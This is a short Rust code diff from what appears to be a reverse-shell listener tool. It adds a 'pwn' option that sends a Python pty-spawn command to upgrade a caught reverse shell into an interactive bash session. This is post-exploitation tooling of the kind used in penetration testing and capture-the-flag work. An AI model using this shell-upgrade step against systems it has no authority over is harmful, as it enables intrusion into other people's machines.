@@ -51,7 +51,18 @@ pub async fn server(host: &str, port: u16, cli: &Cli) -> Result<(), String> {
         eprintln!("Connection received from {}", remote_addr.to_string().green());
     }
 
-    let (mut reader, writer) = handle.into_split();
+    let (mut reader, mut writer) = handle.into_split();
+
+    // Upgrade Reverse shell
+    if cli.pwn {
+        // let mut buf: [u8; 1024];
+
+        match writer.write_all(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n").await {
+            Ok(_)  => {},
+            Err(_) => eprintln!("Failed to initialize reverse shell."),
+        }
+    }
+
 
     let writer = Arc::new(Mutex::new(writer));
 
